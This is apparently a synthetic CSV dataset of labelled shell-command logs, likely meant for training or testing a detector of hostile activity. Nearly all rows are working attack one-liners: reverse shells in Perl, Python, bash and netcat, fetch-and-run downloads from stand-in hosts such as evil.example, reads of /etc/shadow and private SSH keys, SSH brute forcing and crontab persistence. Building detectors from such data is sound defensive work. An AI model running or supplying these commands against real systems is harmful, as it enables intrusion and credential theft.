id,timestamp,log,label
log-805,2025-04-01T00:25:43.546276Z,"python3 -c 'import urllib.request as u;open(""/tmp/payload94.py"",""wb"").write(u.urlopen(""http://malicious.test/payload94.py"").read())'; python3 /tmp/payload94.py",malware_download
log-806,2025-05-21T21:19:44.546285Z,hydra -l root -P /tmp/wordlist.txt ssh://10.0.0.5,brute_force
log-807,2025-10-03T22:42:45.546294Z,"perl -e 'use Socket;$i=""203.0.113.7"";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
log-808,2025-04-16T21:14:26.546304Z,"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""172.16.0.9"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",reverse_shell
log-809,2025-01-16T00:44:30.546313Z,for i in {1..1000}; do ssh root@203.0.113.7 -p 9001 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
log-810,2025-02-16T01:49:00.546323Z,echo '@reboot root /tmp/runme31.sh' >> /etc/crontab,persistence_or_filesystem
log-811,2024-12-21T08:31:22.546332Z,curl http://malware.srv/payload -o /tmp/p && bash /tmp/p,malware_download
log-812,2025-01-02T08:40:45.546341Z,cat /etc/shadow,credential_harvest
log-813,2025-06-10T02:03:13.546350Z,cat /etc/passwd,credential_harvest
log-814,2025-07-06T10:19:01.546360Z,for i in {1..1000}; do ssh root@10.0.0.5 -p 4444 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
log-815,2025-01-24T10:07:47.546370Z,bash -i >& /dev/tcp/172.16.0.9/80 0>&1,reverse_shell
log-816,2025-06-09T03:35:04.546380Z,wget http://malware.srv/p1.sh ; chmod +x p1.sh ; ./ p1.sh,malware_download
log-817,2025-01-04T18:48:00.546390Z,"python3 -c 'import urllib.request as u;open(""/tmp/p63.py"",""wb"").write(u.urlopen(""http://malicious.test/p63.py"").read())'; python3 /tmp/p63.py",malware_download
log-818,2025-01-04T11:54:38.546400Z,"perl -e 'use Socket;$i=""10.0.0.5"";$p=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
log-819,2025-06-21T02:45:23.546409Z,curl http://payloads.net/payload -o /tmp/p && bash /tmp/p,malware_download
log-820,2024-12-06T23:16:02.546418Z,curl -fsSL http://payloads.net/install71.php -o /tmp/install71.php; php /tmp/install71.php,malware_download
log-821,2025-09-18T15:22:41.546428Z,"perl -e 'use Socket;$i=""172.16.0.9"";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
log-822,2025-04-05T17:22:05.546437Z,hydra -l root -P /tmp/wordlist.txt ssh://1.2.3.4,brute_force
log-823,2024-12-13T18:54:04.546446Z,nc -e /bin/sh 45.23.11.9 6666,reverse_shell
log-824,2025-10-06T23:05:25.546455Z,ls -la /; ps aux; netstat -tulpn,reconnaissance
log-825,2025-03-13T16:44:59.546464Z,for i in {1..1000}; do ssh root@45.23.11.9 -p 2222 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
log-826,2025-10-11T18:06:15.546473Z,cat /etc/passwd,credential_harvest
log-827,2025-06-25T20:11:21.546482Z,"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""45.23.11.9"",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",reverse_shell
log-828,2025-10-11T00:22:46.546492Z,"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""1.2.3.4"",2222));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",reverse_shell
log-829,2025-01-08T17:51:37.546500Z,cat /etc/issue; uname -r; dpkg -l | grep openssh,reconnaissance
log-830,2024-12-11T11:40:38.546510Z,"python3 -c 'import urllib.request as u;open(""/tmp/payload84.py"",""wb"").write(u.urlopen(""http://evil.example/payload84.py"").read())'; python3 /tmp/payload84.py",malware_download
log-831,2025-10-02T20:55:38.546520Z,mkdir /tmp/persist6; chmod 777 /tmp/persist6,persistence_or_filesystem
log-832,2025-11-02T10:19:41.546529Z,hydra -l root -P /tmp/wordlist.txt ssh://203.0.113.7,brute_force
log-833,2025-08-31T13:26:05.546538Z,hydra -l root -P /tmp/wordlist.txt ssh://45.23.11.9,brute_force
log-834,2025-07-20T20:22:23.546547Z,hydra -l root -P /tmp/wordlist.txt ssh://1.2.3.4,brute_force
log-835,2025-08-16T17:07:01.546556Z,curl -fsSL http://malware.srv/payload91.php -o /tmp/payload91.php; php /tmp/payload91.php,malware_download
log-836,2025-09-29T18:03:39.546565Z,"grep -Ri ""password"" /home || grep -Ri ""AWS_SECRET"" /etc || cat /root/.ssh/id_rsa",credential_harvest
log-837,2025-10-25T07:54:31.546574Z,find / -name '*.conf' -type f,enumeration
log-838,2025-07-16T21:28:20.546583Z,bash -i >& /dev/tcp/203.0.113.7/9001 0>&1,reverse_shell
log-839,2025-08-16T16:06:04.546593Z,nc -e /bin/sh 172.16.0.9 443,reverse_shell
log-840,2025-09-05T11:10:52.546603Z,"perl -e 'use Socket;$i=""192.0.2.12"";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
log-841,2025-05-19T05:46:37.546613Z,curl -fsSL http://malicious.test/p40.php -o /tmp/p40.php; php /tmp/p40.php,malware_download
log-842,2025-11-30T05:56:31.546622Z,curl -fsSL http://evil.example/p93.php -o /tmp/p93.php; php /tmp/p93.php,malware_download
log-843,2025-09-24T05:03:53.546631Z,"python3 -c 'import urllib.request as u;open(""/tmp/x32.py"",""wb"").write(u.urlopen(""http://evil.example/x32.py"").read())'; python3 /tmp/x32.py",malware_download
log-844,2025-02-21T11:43:47.546641Z,uname -a; id; hostname; ifconfig -a,reconnaissance
log-845,2025-03-03T23:25:34.546650Z,ls /var/www; ls /srv; curl http://localhost:80/.env,enumeration
log-846,2025-05-23T22:32:29.546660Z,wget http://evil.example/x1.sh && chmod +x x1.sh && ./ x1.sh,malware_download
log-847,2025-07-15T14:53:52.546670Z,"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""172.16.0.9"",2222));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",reverse_shell
log-848,2025-05-03T22:26:16.546679Z,curl http://evil.example/payload -o /tmp/p ; bash /tmp/p,malware_download
log-849,2025-06-01T18:14:39.546688Z,cp /bin/bash /tmp/.bash; chmod +x /tmp/.bash; /tmp/.bash -c '...',persistence_or_filesystem
log-850,2025-04-07T01:27:23.546696Z,ss -tulpn; nmap -sT -p- localhost,enumeration
log-851,2025-06-26T09:54:49.546706Z,"python3 -c 'import urllib.request as u;open(""/tmp/x99.py"",""wb"").write(u.urlopen(""http://badhost.local/x99.py"").read())'; python3 /tmp/x99.py",malware_download
log-852,2025-02-28T09:48:29.546715Z,hydra -l root -P /tmp/wordlist.txt ssh://203.0.113.7,brute_force
log-853,2025-02-14T19:55:17.546724Z,for i in {1..1000}; do ssh root@203.0.113.7 -p 443 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
log-854,2025-11-06T15:11:16.546733Z,cat /etc/passwd,credential_harvest
log-855,2025-09-27T23:38:19.546742Z,bash -i >& /dev/tcp/192.0.2.12/8080 0>&1,reverse_shell
log-856,2025-02-13T01:13:16.546751Z,cp /bin/bash /tmp/.bash; chmod +x /tmp/.bash; /tmp/.bash -c '...',persistence_or_filesystem
log-857,2025-02-18T12:44:35.546759Z,hydra -l root -P /tmp/wordlist.txt ssh://1.2.3.4,brute_force
log-858,2025-01-11T03:25:34.546769Z,curl -fsSL http://payloads.net/install93.php -o /tmp/install93.php; php /tmp/install93.php,malware_download
log-859,2025-04-18T07:43:51.546778Z,bash -i >& /dev/tcp/172.16.0.9/4444 0>&1,reverse_shell
log-860,2025-05-27T23:21:04.546787Z,cat /etc/shadow,credential_harvest
log-861,2025-04-11T10:31:30.546796Z,cat /etc/shadow,credential_harvest
log-862,2025-10-28T14:42:05.546807Z,"perl -e 'use Socket;$i=""45.23.11.9"";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
log-863,2025-07-01T21:04:18.546816Z,ls -la /; ps aux; netstat -tulpn,reconnaissance
log-864,2025-06-29T00:30:48.546825Z,cat /etc/issue; uname -r; dpkg -l | grep openssh,reconnaissance
log-865,2024-12-13T00:21:42.546834Z,mkdir /tmp/xdata17; chmod 777 /tmp/xdata17,persistence_or_filesystem
log-866,2025-09-20T11:02:45.546843Z,nc -e /bin/sh 45.23.11.9 4444,reverse_shell
log-867,2025-06-16T17:19:04.546853Z,wget http://malicious.test/payload67.sh && chmod +x payload67.sh && ./ payload67.sh,malware_download
log-868,2025-02-19T05:03:00.546863Z,"perl -e 'use Socket;$i=""172.16.0.9"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
log-869,2025-09-11T17:08:40.546872Z,echo 'hello world',unknown
log-870,2025-07-28T11:48:46.546882Z,curl http://malware.srv/payload -o /tmp/p && bash /tmp/p,malware_download
log-871,2024-12-23T23:12:39.546891Z,uname -a; id; hostname; ifconfig -a,reconnaissance
log-872,2025-11-15T05:18:40.546900Z,hydra -l root -P /tmp/wordlist.txt ssh://10.0.0.5,brute_force
log-873,2025-02-18T13:22:11.546908Z,echo 'hello world',unknown
log-874,2025-10-24T21:20:37.546917Z,find / -name '*.conf' -type f,enumeration
log-875,2024-12-12T10:34:06.546926Z,cat /etc/shadow,credential_harvest
log-876,2025-11-20T06:01:21.546936Z,"python3 -c 'import urllib.request as u;open(""/tmp/runme28.py"",""wb"").write(u.urlopen(""http://evil.example/runme28.py"").read())'; python3 /tmp/runme28.py",malware_download
log-877,2025-07-30T04:45:45.546944Z,cat /etc/passwd,credential_harvest
log-878,2025-08-19T18:27:39.546954Z,curl -fsSL http://evil.example/runme58.php -o /tmp/runme58.php; php /tmp/runme58.php,malware_download
log-879,2024-12-19T22:03:24.546964Z,wget http://evil.example/x45.sh && chmod +x x45.sh && ./ x45.sh,malware_download
log-880,2024-12-30T06:50:42.546973Z,echo '@reboot root /tmp/payload77.sh' >> /etc/crontab,persistence_or_filesystem
log-881,2025-05-12T18:20:19.546982Z,ls -la /; ps aux; netstat -tulpn,reconnaissance
log-882,2024-12-15T08:01:29.546992Z,sshpass -p 'toor' ssh ec2-user@45.23.11.9,brute_force
log-883,2025-06-04T03:19:03.547000Z,"grep -Ri ""password"" /home || grep -Ri ""AWS_SECRET"" /etc || cat /root/.ssh/id_rsa",credential_harvest
log-884,2025-03-04T12:24:09.547010Z,"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""1.2.3.4"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",reverse_shell
log-885,2025-04-27T14:00:53.547019Z,for i in {1..1000}; do ssh root@45.23.11.9 -p 2222 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
log-886,2025-05-11T00:07:57.547029Z,"perl -e 'use Socket;$i=""172.16.0.9"";$p=6666;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
log-887,2025-08-14T11:21:16.547038Z,hydra -l root -P /tmp/wordlist.txt ssh://1.2.3.4,brute_force
log-888,2025-05-29T19:45:14.547047Z,uname -a; id; hostname; ifconfig -a,reconnaissance
log-889,2025-11-23T22:19:22.547057Z,for i in {1..1000}; do ssh root@10.0.0.5 -p 443 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
log-890,2025-01-25T04:26:38.547066Z,ss -tulpn; nmap -sT -p- localhost,enumeration
log-891,2025-08-11T00:16:54.547075Z,nc -e /bin/sh 192.0.2.12 8080,reverse_shell
log-892,2025-10-21T00:30:41.547084Z,cat /etc/passwd,credential_harvest
log-893,2025-06-06T21:06:53.547094Z,wget http://malware.srv/p96.sh && chmod +x p96.sh && ./ p96.sh,malware_download
log-894,2025-10-25T22:40:21.547103Z,bash -i >& /dev/tcp/45.23.11.9/6666 0>&1,reverse_shell
log-895,2025-09-06T00:31:45.547112Z,cat /etc/issue; uname -r; dpkg -l | grep openssh,reconnaissance
log-896,2024-12-20T12:37:07.547121Z,curl http://malicious.test/payload -o /tmp/p ; bash /tmp/p,malware_download
log-897,2025-06-14T15:16:52.547131Z,"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""45.23.11.9"",8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",reverse_shell
log-898,2025-11-25T09:02:51.547140Z,hydra -l root -P /tmp/wordlist.txt ssh://203.0.113.7,brute_force
log-899,2024-12-17T23:17:54.547149Z,sshpass -p 'toor' ssh admin@10.0.0.5,brute_force
log-900,2025-05-16T20:52:41.547160Z,"perl -e 'use Socket;$i=""1.2.3.4"";$p=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
log-901,2025-04-22T12:28:45.547169Z,bash -i >& /dev/tcp/192.0.2.12/4444 0>&1,reverse_shell
log-902,2025-01-18T01:34:02.547178Z,ls -la /; ps aux; netstat -tulpn,reconnaissance
log-903,2025-11-21T23:43:58.547187Z,sshpass -p 'admin123' ssh ec2-user@10.0.0.5,brute_force
log-904,2025-06-29T23:27:15.547196Z,curl http://payloads.net/payload -o /tmp/p ; bash /tmp/p,malware_download
log-905,2025-03-12T19:59:22.547206Z,wget http://badhost.local/payload9.sh && chmod +x payload9.sh && ./ payload9.sh,malware_download
log-906,2025-03-29T09:45:06.547216Z,curl http://malware.srv/payload -o /tmp/p ; bash /tmp/p,malware_download
log-907,2025-07-15T03:15:28.547225Z,curl http://payloads.net/payload -o /tmp/p && bash /tmp/p,malware_download
log-908,2025-01-11T03:18:53.547234Z,cat /etc/issue; uname -r; dpkg -l | grep openssh,reconnaissance
log-909,2025-03-29T05:36:47.547243Z,wget http://payloads.net/update52.sh && chmod +x update52.sh && ./ update52.sh,malware_download
log-910,2025-12-01T22:51:21.547253Z,curl http://payloads.net/payload -o /tmp/p ; bash /tmp/p,malware_download
log-911,2025-07-28T02:20:19.547262Z,curl http://payloads.net/payload -o /tmp/p && bash /tmp/p,malware_download
log-912,2025-10-03T16:16:50.547274Z,curl http://evil.example/payload -o /tmp/p && bash /tmp/p,malware_download
log-913,2025-06-25T10:19:56.547283Z,ss -tulpn; nmap -sT -p- localhost,enumeration
log-914,2025-10-29T01:10:16.547292Z,"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""172.16.0.9"",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",reverse_shell
log-915,2025-06-15T20:18:36.547301Z,echo 'hello world',unknown
log-916,2025-08-16T14:40:02.547310Z,ss -tulpn; nmap -sT -p- localhost,enumeration
log-917,2024-12-20T16:43:27.547319Z,"perl -e 'use Socket;$i=""203.0.113.7"";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
log-918,2025-07-24T02:51:59.547328Z,cp /bin/bash /tmp/.bash; chmod +x /tmp/.bash; /tmp/.bash -c '...',persistence_or_filesystem
log-919,2025-05-17T09:37:22.547337Z,hydra -l root -P /tmp/wordlist.txt ssh://10.0.0.5,brute_force
log-920,2025-05-04T20:50:46.547346Z,for i in {1..1000}; do ssh root@192.0.2.12 -p 9001 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
log-921,2025-08-01T23:51:46.547355Z,"perl -e 'use Socket;$i=""203.0.113.7"";$p=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
log-922,2024-12-13T13:10:39.547365Z,wget http://evil.example/payload13.sh && chmod +x payload13.sh && ./ payload13.sh,malware_download
log-923,2025-01-14T17:25:18.547374Z,nc -e /bin/sh 172.16.0.9 443,reverse_shell
log-924,2024-12-24T01:22:42.547382Z,cat /etc/shadow,credential_harvest
log-925,2025-09-11T03:33:10.547391Z,curl http://payloads.net/payload -o /tmp/p && bash /tmp/p,malware_download
log-926,2024-12-23T17:19:28.547400Z,ls -la /; ps aux; netstat -tulpn,reconnaissance
log-927,2025-03-30T15:08:08.547409Z,ss -tulpn; nmap -sT -p- localhost,enumeration
log-928,2025-01-01T06:13:00.547417Z,date; whoami,unknown
log-929,2025-03-28T02:46:55.547427Z,for i in {1..1000}; do ssh root@172.16.0.9 -p 80 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
log-930,2025-01-20T08:04:02.547436Z,"perl -e 'use Socket;$i=""45.23.11.9"";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
log-931,2025-07-01T20:58:07.547446Z,echo '@reboot root /tmp/install76.sh' >> /etc/crontab,persistence_or_filesystem
log-932,2025-09-22T10:55:44.547456Z,curl http://malware.srv/payload -o /tmp/p && bash /tmp/p,malware_download
log-933,2025-11-29T11:22:57.547464Z,"grep -Ri ""password"" /home || grep -Ri ""AWS_SECRET"" /etc || cat /root/.ssh/id_rsa",credential_harvest
log-934,2025-11-11T18:45:10.547473Z,curl http://malware.srv/payload -o /tmp/p && bash /tmp/p,malware_download
log-935,2025-02-11T00:58:06.547482Z,curl http://malware.srv/payload -o /tmp/p ; bash /tmp/p,malware_download
log-936,2025-02-04T16:35:37.547492Z,nc -e /bin/sh 10.0.0.5 8080,reverse_shell
log-937,2025-07-04T00:47:26.547502Z,"python3 -c 'import urllib.request as u;open(""/tmp/x54.py"",""wb"").write(u.urlopen(""http://badhost.local/x54.py"").read())'; python3 /tmp/x54.py",malware_download
log-938,2025-06-29T09:33:49.547512Z,"perl -e 'use Socket;$i=""45.23.11.9"";$p=2222;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
log-939,2025-02-24T02:56:42.547520Z,cp /bin/bash /tmp/.bash; chmod +x /tmp/.bash; /tmp/.bash -c '...',persistence_or_filesystem
log-940,2025-01-23T08:07:38.547529Z,echo '@reboot root /tmp/payload66.sh' >> /etc/crontab,persistence_or_filesystem
log-941,2025-10-25T01:54:57.547539Z,echo '@reboot root /tmp/install98.sh' >> /etc/crontab,persistence_or_filesystem
log-942,2025-02-10T09:18:31.547548Z,nc -e /bin/sh 203.0.113.7 4444,reverse_shell
log-943,2025-01-19T16:35:16.547558Z,cat /etc/passwd,credential_harvest
log-944,2025-10-06T08:58:51.547566Z,cat /etc/passwd,credential_harvest
log-945,2025-04-03T21:12:22.547576Z,curl -fsSL http://evil.example/p16.php -o /tmp/p16.php; php /tmp/p16.php,malware_download
log-946,2025-09-25T03:58:10.547585Z,ss -tulpn; nmap -sT -p- localhost,enumeration
log-947,2025-07-19T13:39:52.547594Z,bash -i >& /dev/tcp/192.0.2.12/9001 0>&1,reverse_shell
log-948,2025-02-21T13:43:42.547603Z,nc -e /bin/sh 192.0.2.12 443,reverse_shell
log-949,2025-12-02T22:08:35.547612Z,curl http://evil.example/payload -o /tmp/p && bash /tmp/p,malware_download
log-950,2025-01-05T07:24:13.547621Z,bash -i >& /dev/tcp/172.16.0.9/6666 0>&1,reverse_shell
log-951,2025-01-30T03:54:53.547630Z,bash -i >& /dev/tcp/172.16.0.9/9001 0>&1,reverse_shell
log-952,2025-10-19T00:02:23.547640Z,curl http://malicious.test/payload -o /tmp/p ; bash /tmp/p,malware_download
log-953,2025-05-06T01:33:48.547649Z,hydra -l root -P /tmp/wordlist.txt ssh://10.0.0.5,brute_force
log-954,2024-12-14T11:32:27.547658Z,curl http://evil.example/payload -o /tmp/p && bash /tmp/p,malware_download
log-955,2025-03-11T20:54:21.547667Z,bash -i >& /dev/tcp/10.0.0.5/2222 0>&1,reverse_shell
log-956,2025-01-12T08:40:39.547677Z,wget http://evil.example/update53.sh ; chmod +x update53.sh ; ./ update53.sh,malware_download
log-957,2025-04-26T12:20:31.547687Z,sshpass -p 'admin123' ssh ubuntu@192.0.2.12,brute_force
log-958,2025-02-02T08:13:36.547696Z,uname -a; id; hostname; ifconfig -a,reconnaissance
log-959,2025-02-15T19:07:05.547705Z,bash -i >& /dev/tcp/10.0.0.5/2222 0>&1,reverse_shell
log-960,2025-11-22T02:43:55.547715Z,ss -tulpn; nmap -sT -p- localhost,enumeration
log-961,2025-01-02T01:38:16.547724Z,"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""10.0.0.5"",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",reverse_shell
log-962,2025-04-05T23:11:36.547733Z,nc -e /bin/sh 203.0.113.7 80,reverse_shell
log-963,2025-11-27T01:53:30.547742Z,nc -e /bin/sh 1.2.3.4 2222,reverse_shell
log-964,2025-05-27T23:20:50.547752Z,curl -fsSL http://malware.srv/payload62.php -o /tmp/payload62.php; php /tmp/payload62.php,malware_download
log-965,2025-06-14T12:00:49.547761Z,for i in {1..1000}; do ssh root@45.23.11.9 -p 4444 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
log-966,2025-08-02T01:50:10.547770Z,mkdir /tmp/tmpdir2; chmod 777 /tmp/tmpdir2,persistence_or_filesystem
log-967,2025-10-01T05:50:20.547780Z,curl -fsSL http://payloads.net/update78.php -o /tmp/update78.php; php /tmp/update78.php,malware_download
log-968,2025-04-23T16:53:08.547790Z,nc -e /bin/sh 1.2.3.4 9001,reverse_shell
log-969,2025-06-12T12:56:57.547798Z,cp /bin/bash /tmp/.bash; chmod +x /tmp/.bash; /tmp/.bash -c '...',persistence_or_filesystem
log-970,2025-02-26T20:14:00.547807Z,"grep -Ri ""password"" /home || grep -Ri ""AWS_SECRET"" /etc || cat /root/.ssh/id_rsa",credential_harvest
log-971,2025-07-21T17:47:12.547817Z,curl -fsSL http://evil.example/p3.php -o /tmp/p3.php; php /tmp/p3.php,malware_download
log-972,2025-11-14T19:44:07.547826Z,ls -la /; ps aux; netstat -tulpn,reconnaissance
log-973,2025-01-29T15:39:57.547835Z,curl -fsSL http://payloads.net/payload98.php -o /tmp/payload98.php; php /tmp/payload98.php,malware_download
log-974,2025-11-07T23:55:51.547848Z,echo '@reboot root /tmp/runme80.sh' >> /etc/crontab,persistence_or_filesystem
log-975,2025-08-07T23:06:21.547858Z,cat /etc/issue; uname -r; dpkg -l | grep openssh,reconnaissance
log-976,2025-07-19T14:44:17.547867Z,echo '@reboot root /tmp/payload51.sh' >> /etc/crontab,persistence_or_filesystem
log-977,2025-11-28T11:53:26.547876Z,"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""1.2.3.4"",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",reverse_shell
log-978,2025-02-27T16:28:25.547886Z,wget http://badhost.local/p75.sh && chmod +x p75.sh && ./ p75.sh,malware_download
log-979,2025-09-08T22:33:31.547895Z,echo '@reboot root /tmp/install17.sh' >> /etc/crontab,persistence_or_filesystem
log-980,2025-06-28T02:22:46.547903Z,ss -tulpn; nmap -sT -p- localhost,enumeration
log-981,2025-08-08T15:10:26.547912Z,uname -a; id; hostname; ifconfig -a,reconnaissance
log-982,2025-05-09T01:18:28.547921Z,"python3 -c 'import urllib.request as u;open(""/tmp/update74.py"",""wb"").write(u.urlopen(""http://evil.example/update74.py"").read())'; python3 /tmp/update74.py",malware_download
log-983,2025-07-09T05:15:50.547930Z,ls -la /; ps aux; netstat -tulpn,reconnaissance
log-984,2025-03-21T06:44:09.547939Z,curl http://evil.example/payload -o /tmp/p && bash /tmp/p,malware_download
log-985,2025-02-20T09:34:31.547949Z,cat /etc/passwd,credential_harvest
log-986,2025-07-22T20:48:23.547957Z,some-weird-tool --foo bar,unknown
log-987,2025-08-05T11:42:17.547966Z,ls /var/www; ls /srv; curl http://localhost:80/.env,enumeration
log-988,2025-05-06T19:32:30.547975Z,cat /etc/shadow,credential_harvest
log-989,2025-06-29T23:36:44.547984Z,uname -a; id; hostname; ifconfig -a,reconnaissance
log-990,2025-10-06T12:39:55.547994Z,"python3 -c 'import urllib.request as u;open(""/tmp/x59.py"",""wb"").write(u.urlopen(""http://malware.srv/x59.py"").read())'; python3 /tmp/x59.py",malware_download
log-991,2025-09-30T09:09:37.548003Z,"perl -e 'use Socket;$i=""45.23.11.9"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
log-992,2025-06-17T06:22:19.548012Z,ls /var/www; ls /srv; curl http://localhost:80/.env,enumeration
log-993,2025-04-27T17:22:28.548021Z,uname -a; id; hostname; ifconfig -a,reconnaissance
log-994,2025-01-08T11:23:41.548030Z,"grep -Ri ""password"" /home || grep -Ri ""AWS_SECRET"" /etc || cat /root/.ssh/id_rsa",credential_harvest
log-995,2025-11-12T07:22:04.548040Z,"perl -e 'use Socket;$i=""203.0.113.7"";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
log-996,2025-09-06T22:41:36.548049Z,hydra -l root -P /tmp/wordlist.txt ssh://203.0.113.7,brute_force
log-997,2025-07-12T17:56:12.548059Z,curl -fsSL http://payloads.net/update37.php -o /tmp/update37.php; php /tmp/update37.php,malware_download
